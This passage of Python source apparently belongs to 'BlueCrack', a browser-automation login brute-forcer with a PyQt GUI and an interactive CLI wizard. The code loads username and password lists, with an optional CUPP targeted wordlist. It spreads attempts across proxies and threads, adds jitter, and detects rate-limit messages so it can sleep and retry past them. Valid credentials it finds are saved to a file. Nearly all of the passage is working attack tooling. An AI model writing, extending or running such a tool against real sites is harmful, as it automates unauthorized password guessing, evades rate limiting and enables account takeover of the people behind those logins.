            self.speed_val.setText("0.0/s")
            self.eta_val.setText("--:--:--")
            self.hits_val.setText("0")
            self._stats_timer.start()

            self.worker_thread = GuiWorkerThread(ctx)
            self.worker_thread.log_signal.connect(self._log)
            self.worker_thread.progress_signal.connect(self._on_progress)
            self.worker_thread.finished_signal.connect(self._on_finished)
            self.worker_thread.metrics_signal.connect(self._on_metrics)
            self.worker_thread.start()

        def _stop_attack(self) -> None:
            """Request the worker thread to stop."""
            if self.worker_thread and self.worker_thread.isRunning():
                self._log("[!] Stop requested — finishing current attempts...")
                self.worker_thread.request_stop()
                self.status_lbl.setText("Stopping...")

        def _on_progress(self, cur: int, total: int) -> None:
            """Update the progress bar."""
            self.progress.setValue(cur)
            self.status_lbl.setText(f"Progress: {cur}/{total}")

        def _on_finished(self, found: bool, msg: str) -> None:
            """Handle attack completion."""
            self._stats_timer.stop()
            self.start_btn.setEnabled(True)
            self.stop_btn.setEnabled(False)
            self.status_lbl.setText(msg)

            # Final elapsed update
            if self._attack_start_time > 0:
                elapsed = time.time() - self._attack_start_time
                h, rem = divmod(int(elapsed), 3600)
                m, s = divmod(rem, 60)
                self.elapsed_val.setText(f"{h:02d}:{m:02d}:{s:02d}")
                self.eta_val.setText("00:00:00")

            if found:
                self.progress.setStyleSheet(
                    "QProgressBar::chunk { background: qlineargradient("
                    "x1:0,y1:0,x2:1,y2:0, stop:0 #00e676, stop:1 #00c853);"
                    " border-radius: 9px; }"
                )
                QMessageBox.information(self, "Success", msg)
            else:
                self.progress.setStyleSheet(
                    "QProgressBar::chunk { background: qlineargradient("
                    "x1:0,y1:0,x2:1,y2:0, stop:0 #ff5252, stop:1 #d32f2f);"
                    " border-radius: 9px; }"
                )
                QMessageBox.warning(self, "Finished", msg)

    # ── Launch the GUI ──
    app = QApplication(sys.argv)
    app.setStyle("Fusion")
    app.setStyleSheet(DARK_STYLE)
    win = BlueCrackGUI()
    win.show()
    sys.exit(app.exec())
    # GUI mode exits here — CLI code below never runs

# ═══════════════════════════════════════════════════════════════════
# ██  CLI MODE  ██
# ═══════════════════════════════════════════════════════════════════

# INTERACTIVE MODE
if args.interactive:
    print(f"\n{_CYAN}--- WIZARD MODE ---{_RESET}")

    # CUPP Integration
    run_cupp = (
        input("\nGenerate a targeted wordlist first using CUPP? (y/n) [default: n]: ")
        .strip()
        .lower()
        == "y"
    )
    if run_cupp:
        print(
            f"\n{_YELLOW}--- LAUNCHING CUPP (Common User Passwords Profiler) ---{_RESET}"
        )
        if os.path.exists("cupp.py"):
            os.system(f"{sys.executable} cupp.py -i")
            print(
                f"\n{_GREEN}[+] CUPP completed! Make sure to remember the saved filename.{_RESET}\n"
            )
        else:
            print(f"\n{_RED}❌ cupp.py not found in the directory. Skipping...{_RESET}\n")

    args.url = input("\nEnter Target URL: ").strip()
    args.username = (
        input("Enter single username to test (leave blank to skip): ").strip() or None
    )
    if not args.username:
        args.userfile = input("Enter path to usernames list file: ").strip() or None

    # Get password approach correctly in wizard
    single_pass = input("Enter single password to test (leave blank to skip): ").strip()
    if single_pass:
        args.password = single_pass
        args.passfile = None
    else:
        args.password = None
        args.passfile = input("Enter path to passwords list file: ").strip() or None

    threads_in_str = input("Enter number of threads [default: 1]: ").strip()
    args.threads = int(threads_in_str) if threads_in_str.isdigit() else 1

    err_in_str = input("Enter error string to check (default: empty): ").strip()
    if err_in_str:
        args.error = err_in_str

    succ_in_str = input("Enter success string to check (default: empty): ").strip()
    if succ_in_str:
        args.success = succ_in_str

    delay_in_str = input(
        "Enter general delay between attempts in seconds [default: 0]: "
    ).strip()
    args.delay = (
        float(delay_in_str) if delay_in_str.replace(".", "", 1).isdigit() else 0.0
    )

    jitter_in_str = input(
        "Enter jitter/randomizer up to X seconds [default: 0.0]: "
    ).strip()
    args.jitter = (
        float(jitter_in_str) if jitter_in_str.replace(".", "", 1).isdigit() else 0.0
    )

    use_proxy = input("Use proxy? (y/n) [default: n]: ").strip().lower() == "y"
    if use_proxy:
        p_file = input(
            "Enter path to proxy list file (or hit enter to use single proxy): "
        ).strip()
        if p_file:
            args.proxyfile = p_file
        else:
            args.proxy = input(
                "Enter proxy IP:PORT (e.g., http://1.2.3.4:8080): "
            ).strip()

    rl_bypass = (
        input("Enable Auto-Throttle for Rate Limits? (y/n) [default: y]: ")
        .strip()
        .lower()
        != "n"
    )
    args.cooldown = 12 if rl_bypass else 0
    if rl_bypass:
        rl_text = input(
            "Enter Rate Limit text to detect [default: 'too many requests']: "
        ).strip()
        if rl_text:
            args.limit_text = rl_text

    max_att_str = input("Max attempts (0=unlimited) [default: 0]: ").strip()
    args.max_attempts = int(max_att_str) if max_att_str.isdigit() else 0

    cont_str = input(
        "Continue testing after finding credentials? (y/n) [default: n]: "
    ).strip().lower()
    args.continue_after_success = cont_str == "y"

    auto_detect = (
        input("Auto-detect CSS selectors instead of clicking? (y/n) [default: y]: ")
        .strip()
        .lower()
        != "n"
    )
else:
    auto_detect = False
    if not args.url:
        raise SystemExit(f"{_RED}❌ Provide --url or use -i wizard{_RESET}")

if not args.username and not args.userfile:
    raise SystemExit(f"{_RED}❌ Provide -u USER or -U USERFILE{_RESET}")

if not args.password and not args.passfile:
    raise SystemExit(f"{_RED}❌ Provide -p PASS or -P PASSLIST{_RESET}")

# LOAD USERNAMES
users: List[str] = []

if args.username:
    users.append(args.username)

if args.userfile:
    with open(args.userfile, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            users.append(line.strip())

# LOAD PASSWORDS
passwords: List[str] = []

if args.password:
    passwords.append(args.password)

if args.passfile:
    with open(args.passfile, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            px = line.strip()
            if px:  # Avoid empty strings creating false-positive vulnerabilities
                passwords.append(px)

# LOAD PROXIES
proxies: List[str] = []
if args.proxy:
    proxies.append(args.proxy)
if args.proxyfile:
    with open(args.proxyfile, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            if line.strip():
                proxies.append(line.strip())

USERNAME_FIXED: Optional[str] = users[0] if len(users) == 1 else None
USERLIST: Optional[List[str]] = users if len(users) > 1 else None

PASSWORD_FIXED: Optional[str] = passwords[0] if len(passwords) == 1 else None
PASSLIST: Optional[List[str]] = passwords if len(passwords) > 1 else None
WORDLIST: str = f"{len(passwords)} passwords loaded for {len(users)} users"
PROXY_INFO: str = f"{len(proxies)} proxies loaded" if proxies else "No Proxies"

THREADS: int = args.threads
TARGET_URL: str = args.url
if (
    TARGET_URL
    and not TARGET_URL.startswith("http://")
    and not TARGET_URL.startswith("https://")
):
    TARGET_URL = "http://" + TARGET_URL
ERROR_MSG: Optional[str] = args.error.lower() if args.error else None
SUCCESS_MSG: Optional[str] = args.success.lower() if args.success else None
LIMIT_TEXT: Optional[str] = args.limit_text.lower() if args.limit_text else None
COOLDOWN: int = args.cooldown
DELAY: float = args.delay
JITTER: float = args.jitter
RUN_HEADLESS: bool = args.headless
MAX_ATTEMPTS: int = args.max_attempts
CONTINUE_AFTER_SUCCESS: bool = args.continue_after_success
OUTPUT_FILE: str = args.output
JSON_REPORT: bool = args.json_report

# LAUNCH SELENIUM (setup browser)
driver = webdriver.Chrome()
driver.get(TARGET_URL)

username_selector: Optional[str] = None
password_selector: Optional[str] = None
submit_selector: Optional[str] = None

print("\n==============================")
print("🔥 BROWSER BRUTE TESTER 🔥")
print("==============================\n")
print(f"Target URL: {TARGET_URL}")
print(f"User: {USERNAME_FIXED}")
print(f"Wordlist: {WORDLIST}")
print(f"Proxies: {PROXY_INFO}")
print(f"Threads: {THREADS}")
print(f"Delay/Jitter: {DELAY}s / {JITTER}s")
if MAX_ATTEMPTS > 0:
    print(f"Max Attempts: {MAX_ATTEMPTS}")
if CONTINUE_AFTER_SUCCESS:
    print(f"{_CYAN}[*] Will continue after finding credentials{_RESET}")

# Inject JS to track last clicked element
driver.execute_script(CLICK_LISTENER_JS)


# GENERATE CSS SELECTOR FROM CLICKED ELEMENT
def get_css_selector() -> Optional[str]:
    """Get the CSS selector of the last clicked element in the setup browser.

    Returns:
        CSS selector string or None if no element was clicked.
    """
    elem = driver.execute_script("return window._lastClicked")
    if elem is None:
        return None
    return driver.execute_script(CSS_PATH_JS, elem)


if auto_detect:
    print(f"\n{_CYAN}🔍 Auto-detecting login form fields...{_RESET}")
    time.sleep(2)
    try:
        driver.execute_script(AUTO_DETECT_JS)
        detected_selectors = driver.execute_script("return window._autoFindFields();")
        if detected_selectors and detected_selectors[0] and detected_selectors[1]:
            username_selector, password_selector = detected_selectors
            print(f"{_GREEN}✅ AUTO-DETECTED Username: {username_selector}{_RESET}")
            print(f"{_GREEN}✅ AUTO-DETECTED Password: {password_selector}{_RESET}")
        else:
            print(f"{_RED}❌ Auto-detect failed. Please lock manually.{_RESET}")
            auto_detect = False
    except Exception as e:
        print(
            f"{_RED}❌ Auto-detect script failed: {e}. Switching to manual mode.{_RESET}"
        )
        auto_detect = False

# WAIT FOR USER TO LOCK FIELDS
if not auto_detect:
    print(f"\n{_CYAN}👉 CLICK username field → press S{_RESET}")
    print(f"{_CYAN}👉 CLICK password field → press T{_RESET}")
    print(f"{_CYAN}👉 Press ENTER to start brute{_RESET}\n")

while username_selector is None or password_selector is None:
    if keyboard.is_pressed("s"):
        css = get_css_selector()
        if css:
            username_selector = css
            print(f"{_BLUE}🔵 Username selector LOCKED: {css}{_RESET}")
        time.sleep(0.3)
    if keyboard.is_pressed("t"):
        css = get_css_selector()
        if css:
            password_selector = css
            print(f"{_BLUE}🟣 Password selector LOCKED: {css}{_RESET}")
        time.sleep(0.3)

print("\nSelectors locked! Press ENTER to launch brute...")

# TEST THE SELECTORS IMMEDIATELY
driver.find_element(By.CSS_SELECTOR, username_selector)
driver.find_element(By.CSS_SELECTOR, password_selector)

keyboard.wait("enter")

# LOAD WORDLIST INTO QUEUE
q: Queue = Queue(maxsize=1000)
total_combos: int = len(users) * len(passwords)

# CLI metrics
_cli_metrics: Dict[str, int] = {
    "attempted": 0,
    "successes": 0,
    "failures": 0,
    "errors": 0,
    "rate_limit_hits": 0,
    "skipped_empty": 0,
    "requeued": 0,
}
_cli_metrics_lock = threading.Lock()
_cli_found_creds: List[Tuple[str, str]] = []
_cli_found_creds_lock = threading.Lock()
_cli_found_users: Set[str] = set()
_cli_found_users_lock = threading.Lock()
_cli_start_time: float = time.time()


def populate() -> None:
    """Populate the work queue with (user, password) combos."""
    for user in users:
        for pwd in passwords:
            q.put((user, pwd))


threading.Thread(target=populate, daemon=True).start()


# WORKER FUNCTION
def worker() -> None:
    """CLI worker function — runs in a thread, tests credentials via Selenium."""
    global total_combos

    ctx: Dict[str, Any] = {
        "headless": RUN_HEADLESS,
        "proxies": proxies,
        "use_tor": False,
    }
    options = build_chrome_options(ctx)

    thread_driver = create_driver_safe(options)
    if thread_driver is None:
        print(f"{_RED}[-] Thread initialization failed: could not create WebDriver{_RESET}")
        return

    try:
        while not q.empty() and not _FOUND_EVENT.is_set() and not _GLOBAL_STOP.is_set():
            # Check max attempts
            if MAX_ATTEMPTS > 0:
                with _cli_metrics_lock:
                    if _cli_metrics["attempted"] >= MAX_ATTEMPTS:
                        break

            # Check if we should stop (non-continue mode)
            if not CONTINUE_AFTER_SUCCESS and _FOUND_EVENT.is_set():
                break

            user, pwd = q.get()

            # Skip empty passwords
            if not pwd or str(pwd).strip() == "":
                with _cli_metrics_lock:
                    _cli_metrics["skipped_empty"] += 1
                q.task_done()
                continue

            # Skip already solved users (unless continue mode)
            if not CONTINUE_AFTER_SUCCESS:
                with _cli_found_users_lock:
                    if user in _cli_found_users:
                        q.task_done()
                        continue

            try:
                if _FOUND_EVENT.is_set() and not CONTINUE_AFTER_SUCCESS:
                    break
                if _GLOBAL_STOP.is_set():
                    break

                # Add delay if configured
                actual_delay: float = DELAY
                if JITTER > 0.0:
                    actual_delay += random.uniform(0, JITTER)

                if actual_delay > 0.0:
                    for _ in range(int(actual_delay * 10)):
                        if _FOUND_EVENT.is_set() and not CONTINUE_AFTER_SUCCESS:
                            break
                        time.sleep(0.1)

                if (_FOUND_EVENT.is_set() and not CONTINUE_AFTER_SUCCESS) or _GLOBAL_STOP.is_set():
                    break

                thread_driver.get(TARGET_URL)
                if (_FOUND_EVENT.is_set() and not CONTINUE_AFTER_SUCCESS) or _GLOBAL_STOP.is_set():
                    break

                try:
                    u = thread_driver.find_element(By.CSS_SELECTOR, username_selector)
                    p = thread_driver.find_element(By.CSS_SELECTOR, password_selector)
                    u.clear()
                    u.send_keys(user)
                    p.clear()
                    p.send_keys(pwd)
                    p.send_keys(Keys.ENTER)

                    with _cli_metrics_lock:
                        _cli_metrics["attempted"] += 1
                        attempt_num = _cli_metrics["attempted"]

                    if (_FOUND_EVENT.is_set() and not CONTINUE_AFTER_SUCCESS) or _GLOBAL_STOP.is_set():
                        break

                    print(
                        f"[{attempt_num}/{total_combos}] {_CYAN}[*]{_RESET} Trying: {user} / {pwd}"
                    )

                    # Wait for login to process
                    for _ in range(20):
                        if _FOUND_EVENT.is_set() and not CONTINUE_AFTER_SUCCESS:
                            break
                        time.sleep(0.1)

                    if (_FOUND_EVENT.is_set() and not CONTINUE_AFTER_SUCCESS) or _GLOBAL_STOP.is_set():
                        break

                    # Check page
                    page_source: str = thread_driver.page_source.lower()
                    current_url: str = thread_driver.current_url

                    # Check for rate limiting first
                    if LIMIT_TEXT and LIMIT_TEXT in page_source:
                        print(
                            f"[{attempt_num}/{total_combos}] {_YELLOW}[!] Rate Limit detected ('{LIMIT_TEXT}')!{_RESET}"
                        )
                        with _cli_metrics_lock:
                            _cli_metrics["rate_limit_hits"] += 1
                        if COOLDOWN > 0:
                            print(
                                f"{_CYAN}[~] Bypassing... Sleeping {COOLDOWN} seconds before retrying {user}/{pwd}{_RESET}"
                            )
                            for _ in range(COOLDOWN * 10):
                                if _FOUND_EVENT.is_set() and not CONTINUE_AFTER_SUCCESS:
                                    break
                                time.sleep(0.1)
                            if not _FOUND_EVENT.is_set() or CONTINUE_AFTER_SUCCESS:
                                q.put((user, pwd))
                                with _cli_metrics_lock:
                                    _cli_metrics["requeued"] += 1
                        else:
                            print(
                                f"{_RED}[-] Rate limit hit, skipping {user}/{pwd}...{_RESET}"
                            )
                        continue

                    # Check explicit error
                    if ERROR_MSG and ERROR_MSG in page_source:
                        with _cli_metrics_lock:
                            _cli_metrics["failures"] += 1
                        continue

                    # Determine success
                    is_success = False
                    if SUCCESS_MSG:
                        if SUCCESS_MSG in page_source:
                            is_success = True
                        else:
                            with _cli_metrics_lock:
                                _cli_metrics["failures"] += 1
                            continue
                    elif current_url != TARGET_URL and "login" not in current_url.lower():
                        is_success = True
                    elif ERROR_MSG:
                        is_success = True

                    if is_success:
                        print(
                            f"\n{_GREEN}{_BOLD}[+] 🔥🔥 VALID CREDENTIALS FOUND: {user} / {pwd} 🔥🔥{_RESET}\n"
                        )
                        with _cli_metrics_lock:
                            _cli_metrics["successes"] += 1
                        with _cli_found_creds_lock:
                            _cli_found_creds.append((user, pwd))
                        with _cli_found_users_lock:
                            _cli_found_users.add(user)

                        try:
                            with open(OUTPUT_FILE, "a", encoding="utf-8") as cf:
                                cf.write(f"{TARGET_URL} - {user}:{pwd}\n")
                        except Exception as e:
                            print(f"{_RED}[-] Could not save credential: {e}{_RESET}")

                        if not CONTINUE_AFTER_SUCCESS:
                            _FOUND_EVENT.set()
                            with q.mutex:
                                q.queue.clear()
                            break
                    else:
                        with _cli_metrics_lock:
                            _cli_metrics["failures"] += 1

                except (NoSuchElementException, WebDriverException) as e:
                    with _cli_metrics_lock:
                        _cli_metrics["errors"] += 1
                    print(
                        f"{_RED}[-] Error during attempt with '{user} / {pwd}': element not found or page not loaded properly.{_RESET}"
                    )
            except Exception as e:
                with _cli_metrics_lock:
                    _cli_metrics["errors"] += 1
                print(f"{_RED}[-] Navigation or unexpected error: {e}{_RESET}")
            finally:
                q.task_done()
    finally:
        try:
            thread_driver.quit()
        except Exception:
            pass


# Close the initial setup driver
try:
    driver.quit()
except Exception:
    pass

# THREAD LAUNCHER
threads_list: List[threading.Thread] = []
print(f"\n[*] Starting {THREADS} threads...\n")
try:
    for _ in range(THREADS):
        t = threading.Thread(target=worker)
        t.daemon = True
        t.start()
        threads_list.append(t)

    # Wait for completion
    while not q.empty() and not _FOUND_EVENT.is_set() and not _GLOBAL_STOP.is_set():
        time.sleep(0.1)

    if not _FOUND_EVENT.is_set():
        q.join()

    cli_end_time = time.time()

    if not _FOUND_EVENT.is_set():
        print(f"\n{_RED}[-] Finished testing. No valid credentials found.{_RESET}")
    else:
        print(f"\n{_GREEN}[+] Finished testing. Valid credentials found!{_RESET}")

    # Print summary
    print(f"\n{_CYAN}═══ Attack Summary ═══{_RESET}")
    for k, v in _cli_metrics.items():
        print(f"  {k}: {v}")
    elapsed = cli_end_time - _cli_start_time
    print(f"  elapsed: {elapsed:.1f}s")
    if _cli_metrics["attempted"] > 0 and elapsed > 0:
        print(f"  speed: {_cli_metrics['attempted'] / elapsed:.1f} attempts/s")

    # Save JSON report if requested
    if JSON_REPORT:
        _save_json_report(
            "bluecrack_cli_report.json",
            TARGET_URL,
            _cli_metrics,
            _cli_found_creds,
            _cli_start_time,
            cli_end_time,
        )
        print(f"{_GREEN}[+] JSON report saved to bluecrack_cli_report.json{_RESET}")

except KeyboardInterrupt:
    print(f"\n{_YELLOW}[!] Interrupted by user (Ctrl+C). Exiting gracefully...{_RESET}")
    _FOUND_EVENT.set()
    _GLOBAL_STOP.set()
finally:
    if _GLOBAL_STOP.is_set() and not _FOUND_EVENT.is_set():
        print(f"\n{_YELLOW}[!] Stopped by signal. Cleaning up...{_RESET}")
    pass
